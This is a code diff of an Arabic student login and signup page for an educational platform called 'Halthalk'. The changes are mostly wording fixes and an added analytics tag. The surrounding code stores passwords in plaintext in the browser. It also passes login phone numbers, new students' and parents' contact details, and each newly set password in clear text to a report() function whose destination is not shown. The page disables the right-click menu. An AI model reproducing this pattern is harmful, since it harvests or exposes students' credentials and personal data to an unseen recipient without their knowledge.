@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>منصة حلتهالك | لجميع طلاب الجمهورية</title>
+    <title>منصة حلتهالك | منصة تعليمية لطلاب الجمهورية</title>
     <meta name="description" content="منصة حلتهالك التعليمية - سجل دخولك الآن للوصول إلى أقوى الامتحانات والمراجعات والخدمات التعليمية المتكاملة للطلاب.">
     <meta name="keywords" content="منصة حلتهالك, حلتهالك, تعليم, امتحانات, ثانوية عامة, دروس أونلاين, منصة تعليمية">
     <meta name="author" content="Halthalk Platform">
@@ -15,6 +15,14 @@
     <meta property="og:url" content="https://home-halthalk.vercel.app">
     <meta property="og:type" content="website">
     <link rel="canonical" href="https://home-halthalk.vercel.app">
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-MKS3WQ6JPP"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-MKS3WQ6JPP');
+    </script>
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -174,7 +182,7 @@
             <h1>إنشاء حساب طالب</h1>
             <form id="signup-form">
                 <div class="input-group"><label>اسم الطالب</label><input type="text" id="s_name" required></div>
-                <div class="input-group"><label>رقم هاتف الطالب (لالدخول)</label><input type="tel" id="s_phone" maxlength="11" required></div>
+                <div class="input-group"><label>رقم هاتف الطالب (للدخول)</label><input type="tel" id="s_phone" maxlength="11" required></div>
                 <div class="input-group"><label>رقم هاتف الأب</label><input type="tel" id="s_f_phone" maxlength="11" required></div>
                 <div class="input-group"><label>رقم هاتف الأم</label><input type="tel" id="s_m_phone" maxlength="11" required></div>
                 <div class="input-group"><label>البريد الإلكتروني</label><input type="email" id="s_email" required></div>
@@ -314,7 +322,7 @@
                 if(remember) localStorage.setItem('remembered_user', JSON.stringify({phone, pass}));
                 else localStorage.removeItem('remembered_user');
                 
-                await report(`✅ *دخول بنجاح*\n📱 هاتف الطالب: ${phone}`);
+                await report(`✅ *دخول ناجح*\n📱 هاتف الطالب: ${phone}`);
                 showStatus("جاري تحويلك للمنصة...", "success");
                 setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1200);
             } else {
@@ -341,7 +349,6 @@
             };
             saveUser(user);
             
-            // تقرير شامل لبيانات الطالب الجديد
             const reportMsg = `🆕 *طالب جديد سجل بكامل بياناته*\n\n` +
                               `👤 الاسم: ${user.name}\n` +
                               `📱 هاتف الطالب: ${user.phone}\n` +
@@ -392,12 +399,11 @@
             const db = getDB().map(u => { if(u.phone === phone) u.pass = np; return u; });
             localStorage.setItem('hal_users', JSON.stringify(db));
             await report(`🔄 *تغيير كلمة سر*\n📱 ${phone}\n🔐 الجديدة: \`${np}\``);
-            showStatus("تم التحديث! يمكنك الدخول الآن", "success");
+            showStatus("تم التحديث بنجاح!", "success");
             setTimeout(() => switchView('login-view'), 1500);
         };
 
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
-</html>
-
+                                             </html>
